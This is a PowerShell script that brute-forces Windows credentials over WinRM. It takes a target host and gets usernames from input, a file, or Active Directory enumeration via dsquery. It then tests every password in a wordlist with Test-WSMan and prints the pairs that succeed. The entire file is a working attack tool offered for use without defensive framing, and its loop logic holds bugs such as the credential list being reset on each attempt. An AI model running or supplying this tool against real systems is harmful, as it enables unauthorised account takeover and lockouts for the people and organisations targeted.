
    
    
$targetcomputer = ""
$targetuser = @()
$targetpassword = @()



    #----------- Get the target computer ----------------------
    
    Write-Output "Please Enter The Targets Computer Name or IP"

    $compname = Read-Host -Prompt "Target"

    $targetcomputer = $compname

    Write-Output ""
    Write-Output "Please Select One Of The Following Options"
    
    Write-Output "Option 1: Single User | Option 2: Txt File Location | Option 3: Attempt To Extract From AD"
    
        
    [string]$useroption = Read-Host -Prompt "Option Number"

    # -------------user wants single user --------------------------
  
    if ($useroption -eq "1"){ 
    
    $useroption = Read-Host -Prompt "Enter Username"
    $targetuser += $useroption

    }

    # --------- User has a userlist ----------------

    if ($useroption -eq "2"){

    $useroption = Read-Host -Prompt "Enter Path Location"
    $pullusers = Get-Content -Path $useroption

    foreach ($i in $pullusers) {
    
    $targetuser += $i

    }
    
    }

    # --------- user wants to try recon ------------------------

    

    if ($useroption -eq "3"){

    $outputloc = "C:\Temp\users.txt"

    
    dsquery user -name * | dsget user -samid >> $outputloc
    
    $pullusers = Get-Content -Path $outputloc

    foreach ($i in $pullusers) {
    
    $targetuser += $i

    }


    } 

    

    if ($useroption -ne "1" -OR $useroption -ne "2" -OR $useroption -ne "3" ){
    
    #Catch fail
    
    }


  
  # ------------ Get Password List ------------------------

  Write-Output ""
  Write-Output "Please Enter The File Path Of Your Wordlist (C:\Temp\Wordlist.txt)"
 
  
  $passloc = Read-Host -Prompt "File Path"

  $passwordstotry = Get-Content -Path $passloc

  foreach ($p in $passwordstotry) {
  
  $targetpassword += $p 
  
  }



# --------------- Starting Scan -----------------------------

foreach ($u in $targetuser) {


foreach ($p in $targetpassword) {


$Error.clear()

$crackedcreds = @()
$hackedpassword = ""
  
         $secpassword = ConvertTo-SecureString $p -AsPlainText -Force
         $mycredential = New-Object System.Management.Automation.PSCredential ($u, $secpassword)

         #Test Connection of each password
        
         $result = Test-WSMan -ComputerName $targetcomputer -Credential $mycredential -Authentication Negotiate -erroraction SilentlyContinue


   if ($result -eq $null) {

    Write-Output "Testing Password: $p = Failed"
    
    $hackedpassword = $null

    } else {

    #results are successfull and show the password

    Write-Output "Testing Password: $p = Success"
    
    $crackedcreds += $u + "::" + $p
    
        
}



} # foreach password end



} # foreach user end




if ($crackedcreds -ne $null) {

Write-Output "---------------------------------------------------"
Write-Output ""
Write-Output "Success! Here Are The Credentials:"
Write-Output $crackedcreds
Write-Output ""

}

else {

Write-Output "---------------------------------------------------"
Write-Output ""
Write-Output "Brute Force Failed...."

}
    

